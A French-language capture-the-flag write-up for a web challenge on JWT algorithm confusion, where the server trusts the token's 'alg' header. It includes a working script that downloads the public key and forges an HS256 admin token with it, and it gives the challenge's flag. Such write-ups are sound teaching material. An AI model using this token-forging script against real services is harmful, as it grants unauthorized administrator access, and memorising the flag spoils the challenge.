# Signature Déléguée

Web · 350 points · Créé par [@PercevalFox](https://github.com/PercevalFox)

Les jetons sont signés en RS256 (clé privée du serveur), mais le serveur lit l'algorithme dans l'en-tête du jeton au lieu de
l'imposer. On peut donc lui présenter un jeton en HS256, et il vérifiera la signature avec un secret HMAC qui, dans son code,
se trouve être la clé publique. Or la clé publique est donnée sur `/pubkey`. On signe nous-mêmes avec elle.

PyJWT refuse maintenant d'utiliser une clé publique PEM comme secret HMAC, donc on fait la signature à la main.

```bash
B=https://signature-deleguee.cyberzerk.fr
curl -s $B/pubkey -o pub.pem
python3 - <<'PY' > token.txt
import hmac, hashlib, base64, json
b = lambda d: base64.urlsafe_b64encode(d).rstrip(b"=")
h = b(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
p = b(json.dumps({"user": "marc_v", "role": "admin"}).encode())
sig = hmac.new(open("pub.pem", "rb").read(), h + b"." + p, hashlib.sha256).digest()
print((h + b"." + p + b"." + b(sig)).decode())
PY
curl -s $B/admin -H "Authorization: Bearer $(cat token.txt)"
```

**Flag :** `CyberZerk{JWT_c0nfus10n_RS256_v3rs_HS256_cl3_publ1qu3}`
